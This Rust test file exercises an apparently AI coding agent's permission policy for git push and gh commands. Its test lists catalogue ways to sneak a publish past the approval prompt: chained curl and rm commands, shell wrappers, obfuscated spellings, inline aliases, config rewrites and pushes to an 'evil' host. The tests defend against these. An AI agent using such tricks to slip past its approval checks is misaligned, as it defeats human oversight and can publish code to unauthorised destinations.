//! Owner decision 2026-11-19: a workspace worker publishes its own branch without asking; every
//! other publish, and every command chained with one, asks.
use oxa_perm::{DangerRules, ModePolicy, PathGuard};
use oxa_proto::{Access, Autonomy, Decision, Mode, Policy, YoloSwitch};
use std::path::{Path, PathBuf};
use std::sync::Arc;

static SEQ: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);

/// A repo on `branch` whose remote default branch is `main` (as a clone has it).
fn repo(branch: &str) -> PathBuf {
    let n = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let dir = std::env::temp_dir().join(format!(
        "oxa-publish-{}-{}-{n}",
        std::process::id(),
        branch.replace('/', "_")
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(dir.join(".git")).unwrap();
    std::fs::write(dir.join(".git/HEAD"), format!("ref: refs/heads/{branch}\n")).unwrap();
    std::fs::create_dir_all(dir.join(".git/refs/remotes/origin")).unwrap();
    std::fs::write(
        dir.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    dir
}

fn decide(cwd: &Path, level: Autonomy, command: &str) -> Decision {
    let guard = PathGuard::new(
        Path::new("/home/u"),
        Path::new("/home/u/.oxa/agent"),
        Path::new("/tmp/oxa-test"),
    );
    let p = ModePolicy::new()
        .with_guard(guard)
        .with_yolo(YoloSwitch::new(level))
        .with_danger(Arc::new(DangerRules::builtin()), Vec::new());
    p.decide(
        Mode::Workspace,
        &Access::Exec {
            command: command.into(),
            net: false,
        },
        cwd,
    )
}

#[test]
fn own_branch_publish_is_allowed() {
    let cwd = repo("my-branch");
    for c in [
        "git push origin HEAD",
        "git push -u origin my-branch",
        "git push origin HEAD:my-branch",
        "GIT_TERMINAL_PROMPT=0 git push origin HEAD",
        "git -C . push origin HEAD",
        "git status && git push origin HEAD",
        "git push origin HEAD && gh pr create --title t --body b",
        "gh pr checks",
        "gh pr view --json state",
        "gh run watch 12 --exit-status",
        "gh api repos/o/r/pulls/1/comments",
        "git push origin HEAD 2>&1 | tail -n 5",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Allow, "{c}");
        }
    }
}

#[test]
fn push_without_an_explicit_refspec_asks() {
    let cwd = repo("my-branch");
    for c in ["git push", "git push origin"] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }
}

#[test]
fn everything_else_asks() {
    let cwd = repo("my-branch");
    for c in [
        "curl x && git push",
        "git push && curl x",
        "git push; rm -rf y",
        "git push | tee f",
        "git push $(curl x)",
        "git push `curl x`",
        "bash -c \"git push && curl x\"",
        "sh -c 'git push'",
        "eval \"git push\"",
        "git push origin +my-branch",
        "git push origin HEAD:main",
        "git push origin HEAD:refs/heads/main",
        "git push --mirror",
        "git push --all",
        "git push --tags",
        "git push --force",
        "git push origin :my-branch",
        "git push upstream my-branch",
        "git -c remote.origin.url=https://evil/r push",
        "git push https://other/repo",
        "gh pr merge 5 --squash",
        "gh pr create -R other/repo",
        "gh release create v1",
        "gh api -X POST repos/o/r/issues",
        "gh api repos/o/r/issues -f title=x",
        "GIT_SSH_COMMAND=evil git push",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Ask, "{c}");
        }
        // Yolo is unchanged: it never asks.
        assert_eq!(decide(&cwd, Autonomy::Yolo, c), Decision::Allow, "yolo {c}");
    }
}

#[test]
fn default_branch_push_asks_even_when_checked_out() {
    for b in ["main", "master"] {
        let cwd = repo(b);
        for c in ["git push", "git push origin HEAD", "git push origin main"] {
            assert_eq!(decide(&cwd, Autonomy::Standard, c), Decision::Ask, "{b}: {c}");
        }
    }
}

fn set_config(cwd: &Path, text: &str) {
    std::fs::write(cwd.join(".git/config"), text).unwrap();
}

#[test]
fn configured_push_destinations_ask() {
    for cfg in [
        "[remote \"origin\"]\n\tpush = HEAD:refs/heads/main\n",
        "[remote \"origin\"]\n\tpushurl = https://other/r\n",
        "[push]\n\tdefault = upstream\n",
        "[include]\n\tpath = /tmp/x\n",
        "[core]\n\tsshCommand = evil\n",
    ] {
        let cwd = repo("my-branch");
        set_config(&cwd, cfg);
        for c in ["git push", "git push origin", "git push origin HEAD"] {
            assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{cfg} {c}");
        }
    }
    // A branch whose upstream is elsewhere: an implicit push asks, an explicit one does not.
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[branch \"my-branch\"]\n\tremote = other\n\tmerge = refs/heads/main\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Ask);
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
        Decision::Allow
    );
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[branch \"my-branch\"]\n\tremote = origin\n\tmerge = refs/heads/my-branch\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Ask);
}

#[test]
fn unknown_default_branch_asks() {
    let cwd = repo("develop");
    std::fs::remove_file(cwd.join(".git/refs/remotes/origin/HEAD")).unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD:develop"),
        Decision::Ask
    );
    std::fs::write(
        cwd.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/develop\n",
    )
    .unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
        Decision::Ask
    );
}

#[test]
fn earlier_branch_switch_asks() {
    let cwd = repo("my-branch");
    for c in [
        "git switch main && git push origin HEAD",
        "git checkout main && git push",
        "git branch -f x && git push",
        "git switch main && gh pr create --title t --body b",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Ask, "{level:?}: {c}");
        }
    }

    // A later switch cannot change the branch that the earlier push publishes.
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD && git switch main"),
        Decision::Allow
    );
}

#[test]
fn concurrent_branch_switch_asks() {
    let cwd = repo("my-branch");
    for c in [
        "git push origin HEAD | git switch main",
        "git switch main | git push origin HEAD",
    ] {
        for level in [Autonomy::Standard, Autonomy::Auto] {
            assert_eq!(decide(&cwd, level, c), Decision::Ask, "{level:?}: {c}");
        }
    }
}

#[test]
fn gh_spellings_cannot_hide_a_mutation() {
    let cwd = repo("my-branch");
    for c in [
        "gh api repos/o/r/issues --raw-field=title=x",
        "gh api repos/o/r/issues -ftitle=x",
        "gh api repos/o/r/issues -Ftitle=x",
        "gh pr edit --remove-milestone 123 --title changed",
        "gh pr create -Hother-branch --title t --body b",
        "gh pr create --head=other --title t",
        "gh pr update-branch 123 --rebase",
        "gh issue edit 5 --title x",
        "bash -c 'git -C . push origin HEAD:main'",
        "bash -c 'git pu\"\"sh origin HEAD:main'",
        "git --config-env=remote.origin.url=TARGET_URL push origin HEAD",
        "TARGET_URL=https://example.invalid/other git --config-env=remote.origin.url=TARGET_URL push origin HEAD",
        "git --exec-path=/tmp/x push origin HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
        assert_eq!(decide(&cwd, Autonomy::Yolo, c), Decision::Allow, "yolo {c}");
    }
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "gh pr edit --remove-milestone --title x"),
        Decision::Allow
    );
}

#[test]
fn nested_repository_push_asks() {
    let cwd = repo("my-branch");
    let nested = cwd.join("vendor/other");
    std::fs::create_dir_all(nested.join(".git/refs/remotes/origin")).unwrap();
    std::fs::write(nested.join(".git/HEAD"), "ref: refs/heads/feature\n").unwrap();
    std::fs::write(
        nested.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git -C vendor/other push origin HEAD"),
        Decision::Ask
    );
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git -C . push origin HEAD"),
        Decision::Allow
    );
}

#[test]
fn hostile_git_metadata_is_not_read() {
    let cwd = repo("my-branch");
    let nested = cwd.join("nested");
    std::fs::create_dir_all(&nested).unwrap();
    let f = std::fs::File::create(nested.join(".git")).unwrap();
    f.set_len(8 << 20).unwrap();
    assert_eq!(decide(&cwd, Autonomy::Auto, "git -C nested push"), Decision::Ask);
    let cwd = repo("my-branch");
    std::fs::remove_file(cwd.join(".git/HEAD")).unwrap();
    std::os::unix::fs::symlink("/etc/hostname", cwd.join(".git/HEAD")).unwrap();
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push"), Decision::Ask);
}

#[test]
fn origin_url_change_after_baseline_asks() {
    for change in [
        "[remote \"origin\"]\n\turl = https://other/r\n",
        "[remote \"origin\"]\n\tpushurl = https://other/r\n",
        "[url \"https://other/\"]\n\tinsteadOf = https://github.com/\n",
    ] {
        let cwd = repo("my-branch");
        set_config(&cwd, "[remote \"origin\"]\n\turl = https://github.com/o/r\n");
        // The first command of the session records the baseline.
        assert_eq!(decide(&cwd, Autonomy::Auto, "git status"), Decision::Allow);
        assert_eq!(
            decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
            Decision::Allow
        );
        // An earlier call changes the config: the push now asks.
        set_config(
            &cwd,
            &format!("[remote \"origin\"]\n\turl = https://github.com/o/r\n{change}"),
        );
        for c in ["git push", "git push origin HEAD"] {
            assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{change} {c}");
        }
        assert_eq!(decide(&cwd, Autonomy::Yolo, "git push"), Decision::Allow);
    }
}

#[test]
fn command_wrappers_and_cumulative_git_directories_ask() {
    let cwd = repo("my-branch");
    let nested = cwd.join("vendor/other");
    std::fs::create_dir_all(nested.join(".git/refs/remotes/origin")).unwrap();
    std::fs::write(nested.join(".git/HEAD"), "ref: refs/heads/feature\n").unwrap();
    std::fs::write(
        nested.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    for c in [
        "env git push origin HEAD:main",
        "env git -c alias.ship=push ship origin HEAD:main",
        "env -i git -C . push origin HEAD:main",
        "command git push origin HEAD:main",
        "git -C vendor/other -C . push origin HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }

    // A second relative `-C` is resolved from the first directory. Walking back to the session
    // repository is safe, while staying in the nested repository must continue to ask.
    std::fs::create_dir_all(cwd.join("vendor/plain")).unwrap();
    assert_eq!(
        decide(
            &cwd,
            Autonomy::Auto,
            "git -C vendor/plain -C ../.. push origin HEAD"
        ),
        Decision::Allow
    );
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git -C vendor -C other push origin HEAD"),
        Decision::Ask
    );
}

#[test]
fn command_launcher_classifies_the_wrapped_push() {
    let cwd = repo("my-branch");
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "command git push origin HEAD"),
        Decision::Allow
    );
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "command git push origin HEAD:main"),
        Decision::Ask
    );
}

#[test]
fn wrapper_semantics_keep_the_publish_floor() {
    let cwd = repo("my-branch");
    // A wrapper is peeled only when its whole semantics reach the classification: a
    // path-qualified word is an executable of the caller's choice and not the wrapper it
    // spells, `env -C` runs the wrapped command in another directory, `env -S`/`su -c`/
    // `watch` carry an inline script, `xargs` appends arguments the command line does not
    // show, and assignments inside `env` reach the wrapped command.
    for c in [
        "./command git push origin HEAD",
        "/usr/bin/env git push origin HEAD",
        "env -C vendor/other gh pr create --title t --body b",
        "env --chdir=vendor/other git push origin HEAD",
        "env -S 'gh pr merge 5 --squash'",
        "env -S 'git push origin HEAD:main'",
        "su -c 'gh pr merge 5 --squash'",
        "watch git push origin HEAD:main",
        "env GH_REPO=o/other gh pr create --title t --body b",
        "env GIT_CONFIG_COUNT=1 git push origin HEAD",
        "xargs -a refs.txt git push origin HEAD",
        "xargs git push origin HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }
    // Exact wrappers without extra semantics still classify the wrapped command.
    for c in [
        "command git push origin HEAD",
        "env git push origin HEAD",
        "env -i git push origin HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Allow, "{c}");
    }
}

#[test]
fn argv_rewriting_wrapper_keeps_publish_floor() {
    let cwd = repo("my-branch");
    let command = "sh drop-second git ignored push origin HEAD:main";

    let hits = DangerRules::builtin().publish_classify(command, &cwd);
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].rule, "publish-unsafe");
    assert_eq!(hits[0].segment, command);
}

#[test]
fn unordered_pushes_and_ref_writing_plumbing_ask() {
    let cwd = repo("my-branch");
    for c in [
        "(sleep 1; git push origin HEAD) & git switch main",
        "git push origin HEAD &",
        "git send-pack https://example.invalid/other.git HEAD:refs/heads/main",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }
}

#[test]
fn clustered_api_methods_ask_for_mutations() {
    let cwd = repo("my-branch");
    for command in [
        "gh api -iXDELETE repos/o/r/git/refs/heads/feature",
        "gh api -iX DELETE repos/o/r/git/refs/heads/feature",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Ask, "{command}");
    }
    for command in ["gh api -iXGET repos/o/r", "gh api -iX get repos/o/r"] {
        assert_eq!(
            decide(&cwd, Autonomy::Auto, command),
            Decision::Allow,
            "{command}"
        );
    }
}

#[test]
fn legacy_config_sections_ask() {
    let cwd = repo("my-branch");
    set_config(&cwd, "[remote.ORIGIN]\n\tpush = HEAD:refs/heads/main\n");
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push origin"), Decision::Ask);
}

#[test]
fn rewritten_default_branch_cannot_authorize_its_push() {
    let cwd = repo("develop");
    std::fs::write(
        cwd.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/develop\n",
    )
    .unwrap();
    // A harmless first command pins the remote's real default for this session.
    assert_eq!(decide(&cwd, Autonomy::Auto, "git status"), Decision::Allow);
    // This is the metadata change made by
    // `git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main`.
    std::fs::write(
        cwd.join(".git/refs/remotes/origin/HEAD"),
        "ref: refs/remotes/origin/main\n",
    )
    .unwrap();
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "git push origin HEAD"),
        Decision::Ask
    );
}

#[test]
fn unparsed_commands_keep_the_publish_floor() {
    let cwd = repo("my-branch");
    let nested = "$(echo ".repeat(9) + "x" + &")".repeat(9);
    let command = format!("git push origin HEAD:main; echo {nested}");
    assert_eq!(decide(&cwd, Autonomy::Auto, &command), Decision::Ask);
}

#[test]
fn escaped_config_refspecs_and_explicit_head_destinations_ask() {
    let cwd = repo("my-branch");
    set_config(&cwd, "[remote \"ori\\gin\"]\n\tpush = HEAD:refs/heads/main\n");
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push origin"), Decision::Ask);

    let cwd = repo("my-branch");
    for command in [
        "git push origin HEAD:HEAD",
        "git push origin HEAD:refs/heads/HEAD",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Ask, "{command}");
    }
}

#[test]
fn local_writers_and_path_qualified_publish_tools_ask() {
    let cwd = repo("my-branch");
    for command in [
        "printf 'ref: refs/heads/main\\n' | sort -o .git/HEAD && git push origin HEAD",
        "./git push origin HEAD",
        "/tmp/gh pr create --title t --body b",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Ask, "{command}");
    }
}

#[test]
fn continued_config_values_and_git_aliases_ask() {
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[remote \"origin\"]\n\tharmless = x\\\n[ignored]\n\tpush = HEAD:refs/heads/main\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, "git push origin"), Decision::Ask);

    let cwd = repo("my-branch");
    set_config(&cwd, "[alias]\n\tship = push origin HEAD:main\n");
    for c in [
        "git ship",
        "git status && git ship",
        "git -c alias.ship='push origin HEAD:refs/heads/main' ship",
        "git --config-env=alias.ship=SHIP_COMMAND ship",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask, "{c}");
    }
    let cwd = repo("my-branch");
    assert_eq!(
        decide(
            &cwd,
            Autonomy::Auto,
            "git -c alias.ship='push origin HEAD:refs/heads/main' ship"
        ),
        Decision::Ask
    );
}

#[test]
fn opaque_globals_on_a_builtin_subcommand_stay_local() {
    let cwd = repo("my-branch");
    // A builtin subcommand cannot be shadowed by an alias, so `git -c user.name=.. commit`
    // (the `oxa work` save flow) stays local; only a non-builtin name with opaque globals,
    // where an inline alias can hide, asks.
    for c in [
        "git -c user.name=Test -c user.email=test@example.invalid commit -m task",
        "git -c core.editor=true status",
    ] {
        assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Allow, "{c}");
    }
}

#[test]
fn gh_mutation_is_bound_to_the_recorded_repository() {
    let cwd = repo("my-branch");
    set_config(&cwd, "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n");
    let c = "gh pr comment --body hi";
    assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Allow);
    set_config(
        &cwd,
        "[remote \"origin\"]\n\turl = https://github.com/o/other.git\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, c), Decision::Ask);
    assert_eq!(
        decide(&cwd, Autonomy::Auto, "GH_REPO=o/other gh pr comment --body hi"),
        Decision::Ask
    );
}

#[test]
fn gh_mutation_fingerprint_includes_remotes_after_risky_settings() {
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[push]\n\tdefault = simple\n[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
    );
    let command = "gh pr comment --body hi";
    assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Allow);

    set_config(
        &cwd,
        "[push]\n\tdefault = simple\n[remote \"origin\"]\n\turl = https://github.com/o/other.git\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Ask);
}

#[test]
fn gh_mutation_fingerprint_preserves_origin_url_order() {
    let cwd = repo("my-branch");
    set_config(
        &cwd,
        "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n[push]\n\tdefault = simple\n[remote \"origin\"]\n\turl = https://github.com/o/other.git\n",
    );
    let command = "gh pr comment --body hi";
    assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Allow);

    set_config(
        &cwd,
        "[remote \"origin\"]\n\turl = https://github.com/o/other.git\n[push]\n\tdefault = simple\n[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
    );
    assert_eq!(decide(&cwd, Autonomy::Auto, command), Decision::Ask);
}

#[test]
fn gh_mutation_fails_closed_when_config_includes_another_file() {
    for include in [
        "[include]\n\tpath = project.inc\n",
        "[includeIf \"gitdir:~/project/\"]\n\tpath = project.inc\n",
    ] {
        let cwd = repo("my-branch");
        set_config(
            &cwd,
            &format!("{include}[remote \"origin\"]\n\turl = https://github.com/o/r.git\n"),
        );

        assert_eq!(
            decide(&cwd, Autonomy::Auto, "gh pr comment --body hi"),
            Decision::Ask,
            "{include} must invalidate the repository fingerprint"
        );
    }
}
